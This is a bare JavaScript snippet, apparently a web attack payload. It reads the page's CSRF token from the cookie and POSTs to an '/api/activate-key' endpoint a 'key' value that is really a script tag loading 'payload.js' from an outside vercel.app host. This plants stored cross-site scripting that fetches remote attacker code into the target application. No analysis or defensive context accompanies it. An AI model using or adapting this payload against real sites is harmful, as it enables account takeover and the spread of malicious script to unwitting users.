var csrf = document.cookie.split('csrf_token=')[1]?.split(';')[0] || '';
fetch('/api/activate-key', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrf
  },
  credentials: 'same-origin',
  body: JSON.stringify({
    key: '<script src="https://evil-rose-tau.vercel.app/payload.js"><\/script>'
  })
}).then(r => r.json()).then(d => console.log(d));